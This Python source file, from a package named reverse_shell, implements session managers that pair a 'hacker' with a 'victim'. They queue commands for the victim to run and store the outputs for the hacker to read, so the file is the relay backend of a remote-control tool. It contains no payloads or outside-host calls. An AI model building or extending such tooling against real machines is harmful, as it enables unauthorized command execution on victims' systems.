# --- the imports
from abc import ABC, abstractmethod
from pathlib import Path
from typing import Optional, TypedDict
from typing_extensions import override

import reverse_shell.utils as ut
import sqlite3 as sq


class Output(TypedDict):
    stdout: str
    stderr: str


class Response(TypedDict):
    response: Output
    command_status_code: Optional[int]
    failed_to_execute: bool


class Communication(TypedDict):
    command: str | None
    responses: list[Response]


class SessionKeys(TypedDict):
    hacker_id: Optional[str]
    victim_id: str
    alive: bool


class SessionDoesNotExist(Exception):
    """Exception raised if session doesn't exist."""

    def __init__(self, session_id: str):
        self.message = f"The session `{session_id}` doesn't exist"
        super().__init__(self.message)


class ClientAlreadyInSession(Exception):
    """Exception raised if the client is already in a session"""

    def __init__(self, client_id: str):
        self.message = f"The client `{client_id}` is already in a session."


class SessionManager(ABC):
    """Manages sessions(hackers with victims) and allows to add new sessions, delete existing ones
    and etc... using a session_id."""

    @abstractmethod
    def add_session(self, hacker_id: str, victim_id: str) -> str:
        """Create a new session based on the hacker and victim id provided."""
        pass

    @abstractmethod
    def kill_session(self, session_id: str):
        """Deactivate the given session"""
        pass

    @abstractmethod
    def edit_session(
        self,
        session_id: str,
        hacker_id: Optional[str] = None,
        victim_id: Optional[str] = None,
    ):
        """Change the either hacker_id or victim_id(or both of them) properties of the session with specified `session_id`."""
        pass

    @abstractmethod
    def check_session_alive(self, session_id: str) -> bool:
        """Check if the given session is alive"""
        pass

    @abstractmethod
    def remove_session(self, session_id: str):
        """Remove the session based on the session id."""
        pass

    @abstractmethod
    def get_session(self, session_id: str) -> SessionKeys:
        """Get the session i.e the hacker and victim inside it using the session_id."""
        pass

    @abstractmethod
    def get_session_id(self, client_id: str) -> Optional[str]:
        """Get the session id using the id of either the hacker or the victim"""
        pass

    @abstractmethod
    def insert_command(self, session_id: str, cmd: str):
        """Set the command for it to be executed by the victim."""
        pass

    @abstractmethod
    def insert_response(
        self,
        session_id: str,
        stdout: str,
        stderr: str,
        command_status_code: Optional[int],
        failed_to_execute: bool,
    ):
        """Add the result of a command for it to be read by the hacker"""
        pass

    @abstractmethod
    def get_command(self, session_id: str) -> Optional[str]:
        """Fetch the latest command from the hacker."""
        pass

    @abstractmethod
    def get_response(self, session_id: str) -> list[Response]:
        """Fetch the response(s) from the victim"""
        pass

    @abstractmethod
    def check_session_exists(self, session_id: str) -> bool:
        """Check if the given session exists and is active."""
        pass

    @abstractmethod
    def check_client_in_session(self, client_id: str) -> bool:
        """Check if the given client is in a session. The client should be either a victim or hacker"""
        pass


# TODO(extra): Use decorators to replace repetitive if blocks in all SessionManager implementations
# ---- Session implementations
class OnDiskSessionManager(SessionManager, ut.DatabaseUtils):
    """An on disk implementation of `SessionManager` using SQLite DB"""

    schema = [
        """\
DROP TABLE IF EXISTS sessions
""",
        """\
DROP TABLE IF EXISTS responses
""",
        """\
DROP TABLE IF EXISTS commands
""",
        """\
DROP TRIGGER IF EXISTS kill_session
""",
        """\
DROP TRIGGER IF EXISTS update_command_for_new_session
""",
        """\
CREATE TABLE sessions(
    id TEXT PRIMARY KEY,
    hacker_id TEXT UNIQUE,
    victim_id TEXT UNIQUE,
    alive INT
)
""",
        """\
CREATE TABLE responses(
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    stdout TEXT,
    stderr TEXT,
    failed_to_execute INT,
    command_status_code INT,
    session_id TEXT,
    FOREIGN KEY(session_id) REFERENCES sessions(id)
)
""",
        """\
CREATE TABLE commands(
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    command TEXT,
    session_id TEXT,
    FOREIGN KEY(session_id) REFERENCES sessions(id)
)
""",
        """\
CREATE TRIGGER kill_session
AFTER DELETE ON sessions
BEGIN
DELETE FROM commands WHERE session_id=old.id;
DELETE FROM responses WHERE session_id=old.id;
END;
""",
        """\
CREATE TRIGGER update_command_for_new_session
AFTER INSERT ON sessions
BEGIN
INSERT INTO commands VALUES(null, null, new.id);
END;
""",
    ]

    def __init__(self, base_dir: Path, allow_multithreaded_db: bool = True):
        # Initiate the database connection
        self.db_connection = self.__get_database(base_dir, allow_multithreaded_db)

        # Initiate the db_cursor
        self.db_cursor = self.db_connection.cursor()
        self.__initialize_database()
        ut.DatabaseUtils.__init__(self, self.db_connection)

    def __get_database(self, base_dir: Path, allow_multithreaded_db: bool):
        """Return a database connection"""
        session_db = base_dir / "sessions.db"
        session_db.touch(exist_ok=True)
        return sq.connect(session_db, check_same_thread=not allow_multithreaded_db)

    def __initialize_database(self):
        """Initialize the tables of the database"""
        # Let's create the schema
        for table_cmd in self.schema:
            self.execute(table_cmd, raise_for_error=True)

    @override
    def add_session(self, hacker_id: str, victim_id: str) -> str:
        if self.check_client_in_session(hacker_id):
            raise ClientAlreadyInSession(hacker_id)

        if self.check_client_in_session(victim_id):
            raise ClientAlreadyInSession(victim_id)

        session_id: str = ut.generate_token()
        # Records will automatically be created into the command
        # table(tnx to the TRIGGER)
        self.execute(
            "INSERT INTO sessions VALUES(?, ?, ?, ?)",
            (session_id, hacker_id, victim_id, 1),
            raise_for_error=True,
        )
        return session_id

    @override
    def check_session_exists(self, session_id: str) -> bool:
        result = self.query("SELECT * FROM sessions WHERE id=?", (session_id,))
        return len(result) != 0

    @override
    def check_client_in_session(self, client_id: str) -> bool:
        result = self.query(
            "SELECT * FROM sessions WHERE hacker_id=? OR victim_id=?",
            (client_id, client_id),
            raise_for_error=True,
        )
        return len(result) != 0

    @override
    def edit_session(
        self,
        session_id: str,
        hacker_id: str | None = None,
        victim_id: str | None = None,
    ):
        if not self.check_session_exists(session_id):
            raise SessionDoesNotExist(session_id)

        if hacker_id is not None:
            self.execute(
                "UPDATE sessions SET hacker_id=? WHERE id=?", (hacker_id, session_id)
            )
        if victim_id is not None:
            self.execute(
                "UPDATE sessions SET victim_id=? WHERE id=?", (victim_id, session_id)
            )

    @override
    def kill_session(self, session_id: str):
        if not self.check_session_exists(session_id):
            raise SessionDoesNotExist(session_id)

        self.execute("UPDATE sessions SET alive=0 WHERE id=?", (session_id,))
        self.execute("UPDATE sessions SET hacker_id=?", (None,))

    @override
    def get_command(self, session_id: str) -> str | None:
        if not self.check_session_exists(session_id):
            raise SessionDoesNotExist(session_id)

        command: Optional[str] = self.query(
            "SELECT command FROM commands WHERE session_id = ?", (session_id,)
        )[0][0]

        # Now delete this command from the database
        self.execute(
            "UPDATE commands SET command=? WHERE session_id=?",
            (
                None,
                session_id,
            ),
        )
        return command

    @override
    def get_session(self, session_id: str) -> SessionKeys:
        if not self.check_session_exists(session_id):
            raise SessionDoesNotExist(session_id)

        session: tuple[str, str, int] = self.query(
            "SELECT hacker_id, victim_id, alive FROM sessions WHERE id=?", (session_id,)
        )[0]
        return {
            "hacker_id": session[0],
            "victim_id": session[1],
            "alive": bool(session[2]),
        }

    @override
    def get_session_id(self, client_id: str) -> str | None:
        if not self.check_client_in_session(client_id):
            return None

        session: str = self.query(
            "SELECT id FROM sessions WHERE hacker_id=? OR victim_id=?",
            (client_id, client_id),
        )[0][0]
        return session

    @override
    def insert_command(self, session_id: str, cmd: str):
        if not self.check_session_exists(session_id):
            raise SessionDoesNotExist(session_id)

        self.execute(
            "UPDATE commands SET command=? WHERE session_id=?", (cmd, session_id)
        )

    @override
    def remove_session(self, session_id: str):
        # Delete the session from the sessions table
        # the other tables will be taken care of(tnx to the TRIGGER)
        self.execute("DELETE FROM sessions WHERE id=?", (session_id,))

    @override
    def get_response(self, session_id: str) -> list[Response]:
        if not self.check_session_exists(session_id):
            raise SessionDoesNotExist(session_id)

        # Get all the responses from the responses table
        responses: list[tuple[str, str, int, Optional[int]]] = self.query(
            "SELECT stdout, stderr, failed_to_execute, command_status_code FROM responses WHERE session_id=? ORDER BY id ASC",
            (session_id,),
        )

        # And now delete other responses
        self.execute("DELETE FROM responses WHERE session_id=?", (session_id,))

        # Format the sql result to the required format
        return [
            {
                "response": {"stdout": response[0], "stderr": response[1]},
                "failed_to_execute": bool(response[2]),
                "command_status_code": response[3],
            }
            for response in responses
        ]

    @override
    def insert_response(
        self,
        session_id: str,
        stdout: str,
        stderr: str,
        command_status_code: int | None,
        failed_to_execute: bool,
    ):
        # Insert responses to the database
        # No need to calculate a new ID since the ID is auto incremented
        # by sqlite
        self.execute(
            "INSERT INTO responses VALUES(?, ?, ?, ?, ?, ?)",
            (
                None,
                stdout,
                stderr,
                int(failed_to_execute),
                command_status_code,
                session_id,
            ),
        )

    @override
    def check_session_alive(self, session_id: str) -> bool:
        if not self.check_session_exists(session_id):
            raise SessionDoesNotExist(session_id)

        result = self.query(
            "SELECT alive FROM sessions WHERE id=?", (session_id,), raise_for_error=True
        )[0]
        return bool(result[0])


class InMemorySessionManager(SessionManager):
    """An InMemory implementation of `SessionManager` using python dictionaries."""

    def __init__(self):
        # Let's define variables and data structures that help us
        # control the sessions

        self._sessions: dict[str, SessionKeys] = {
            # session_id: SessionKeys
        }

        # The way the hacker and the victim talk is through this database.
        self._session_communications: dict[str, Communication] = {
            # session_id: Communication
        }

    @override
    def add_session(self, hacker_id: str, victim_id: str) -> str:
        # First check if either the hacker or the hacker are already in  a session.
        if self.check_client_in_session(hacker_id):
            raise ClientAlreadyInSession(hacker_id)

        if self.check_client_in_session(victim_id):
            raise ClientAlreadyInSession(victim_id)

        # Creating the session id
        session_id: str = ut.generate_token()

        # Initializing the data in both dictionaries
        self._sessions[session_id] = {
            "hacker_id": hacker_id,
            "victim_id": victim_id,
            "alive": True,
        }

        self._session_communications[session_id] = {
            "command": None,
            "responses": [],
        }

        # And also add the hacker and victim in the client list
        return session_id

    @override
    def kill_session(self, session_id: str):
        # Make sure the session exists before activation
        if not self.check_session_exists(session_id):
            raise SessionDoesNotExist(session_id)

        # Let's deactivate the session
        self._sessions[session_id]["alive"] = False

        # Change the hacker_id value in the session
        # to None.
        self._sessions[session_id]["hacker_id"] = None

    @override
    def edit_session(
        self,
        session_id: str,
        hacker_id: Optional[str] = None,
        victim_id: Optional[str] = None,
    ):
        # Session sanity check
        if not self.check_session_exists(session_id):
            raise SessionDoesNotExist(session_id)

        # Now if the session does exist, it's just a matter of simple
        # if conditions
        if hacker_id is not None:
            self._sessions[session_id]["hacker_id"] = hacker_id
        if victim_id is not None:
            self._sessions[session_id]["victim_id"] = victim_id

    @override
    def check_session_alive(self, session_id: str) -> bool:
        # first check if the session exists
        if not self.check_session_exists(session_id):
            raise SessionDoesNotExist(session_id)

        return self._sessions[session_id]["alive"]

    @override
    def remove_session(self, session_id: str):
        # First check if the session exists
        if not self.check_session_exists(session_id):
            raise SessionDoesNotExist(session_id)

        # Now let's fetch the hacker and victim with that session_id
        hacker_victim_ids = self._sessions[session_id]

        # Removing them from the client_list list
        for client_id in list(hacker_victim_ids.values())[:-1]:
            if client_id is None:
                # This only happens if a hacker exited a session
                # and it is being removed now se we can skip it
                continue

        del self._session_communications[session_id]
        del self._sessions[session_id]

    @override
    def get_session(self, session_id: str) -> SessionKeys:
        # First check if the session is up and running
        if not self.check_session_exists(session_id):
            raise SessionDoesNotExist(session_id)

        return self._sessions[session_id]

    @override
    def get_session_id(self, client_id: str) -> Optional[str]:
        if not self.check_client_in_session(client_id):
            return None

        session_id = [
            session_id
            for session_id, session in self._sessions.items()
            if session["victim_id"] == client_id or session["hacker_id"] == client_id
        ][0]

        return session_id

    @override
    def insert_command(self, session_id: str, cmd: str):
        # First let's see if the session is active
        if not self.check_session_exists(session_id):
            raise SessionDoesNotExist(session_id)

        # Now let's insert the command inside the session
        self._session_communications[session_id]["command"] = cmd

    @override
    def insert_response(
        self,
        session_id: str,
        stdout: str,
        stderr: str,
        command_status_code: Optional[int],
        failed_to_execute: bool,
    ):
        # As always first check if the session is active
        if not self.check_session_exists(session_id):
            raise SessionDoesNotExist(session_id)

        # Now append the response in the list of responses
        self._session_communications[session_id]["responses"].append(
            {
                "response": {"stdout": stdout, "stderr": stderr},
                "command_status_code": command_status_code,
                "failed_to_execute": failed_to_execute,
            }
        )

    @override
    def get_command(self, session_id: str) -> Optional[str]:
        if not self.check_session_exists(session_id):
            raise SessionDoesNotExist(session_id)

        # Fetch the command from the session communications
        cmd = self._session_communications[session_id]["command"]
        # Resetting the command to an empty string
        self._session_communications[session_id]["command"] = None
        return cmd

    @override
    def get_response(self, session_id: str) -> list[Response]:
        # Check if the session is active
        if not self.check_session_exists(session_id):
            raise SessionDoesNotExist(session_id)

        # Fetch all responses
        res = self._session_communications[session_id]["responses"]
        self._session_communications[session_id]["responses"] = []
        return res

    @override
    def check_session_exists(self, session_id: str) -> bool:
        return True if self._sessions.get(session_id, None) is not None else False

    @override
    def check_client_in_session(self, client_id: str) -> bool:
        sessions = list(self._sessions.values())
        for session in sessions:
            if client_id == session["hacker_id"]:
                return True
            elif client_id == session["victim_id"]:
                return True

        return False
